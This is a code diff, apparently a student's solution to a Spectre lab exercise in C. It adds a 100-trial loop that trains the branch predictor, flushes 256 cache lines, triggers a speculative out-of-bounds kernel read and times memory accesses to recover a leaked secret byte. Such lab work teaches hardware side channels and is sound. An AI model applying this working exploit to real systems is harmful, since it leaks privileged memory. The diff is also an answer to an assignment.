@@ -47,28 +47,29 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
-
-        // Train Branch Predictor
-        for (int train = 0; train < 5; train++) {
-            call_kernel_part2(kernel_fd, shared_memory, t % 4);
-        }
-
-
-        for (int i = 0; i < 256; i++) {
-            clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
-        }
-
-        call_kernel_part1(kernel_fd, shared_memory, current_offset);
-
         uint64_t shortest_access = (uint64_t) -1;
         int best_i = -1;
-        for (int i = 0; i < 256; i++) {
-            uint64_t access_time = time_access(&shared_memory[i*SHD_SPECTRE_LAB_PAGE_SIZE]);
-            if (access_time < shortest_access) {
-                shortest_access = access_time;
-                best_i = i;
+        for (int trial = 0; trial < 100; trial++) {
+            // Train Branch Predictor
+            for (int train = 0; train < 5; train++) {
+                call_kernel_part2(kernel_fd, shared_memory, t % 4);
+            }
+
+            for (int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
+            }
+            
+            call_kernel_part1(kernel_fd, shared_memory, current_offset);
+
+            for (int i = 0; i < 256; i++) {
+                uint64_t access_time = time_access(&shared_memory[i*SHD_SPECTRE_LAB_PAGE_SIZE]);
+                if (access_time < shortest_access) {
+                    shortest_access = access_time;
+                    best_i = i;
+                }
             }
         }
+
         leaked_byte = (char) best_i;
 
         leaked_str[current_offset] = leaked_byte;
